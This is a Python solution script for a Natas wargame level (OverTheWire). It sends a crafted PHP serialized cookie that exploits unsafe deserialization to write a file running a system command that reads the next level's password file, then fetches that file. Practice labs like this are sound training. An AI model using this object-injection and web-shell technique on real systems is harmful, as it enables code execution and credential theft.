#!/bin/python
import requests

username = "natas26"
pwd = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"
url = f"http://{username}.natas.labs.overthewire.org/"
session = requests.Session()
res=session.get(url,auth=(username,pwd))

session.cookies['drawing']='Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL3N0aW5nLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjEwOiJHb3RjaGEgISEKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw%2FcGhwIHN5c3RlbSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8%2BCiI7fQ%3D%3D'

res= session.get(url+'?x1=0&y1=0&x2=400&y2=500',auth=(username,pwd))
#print(res.text)

response=session.get(url+'/img/sting.php',auth=(username,pwd))
print(response.text)

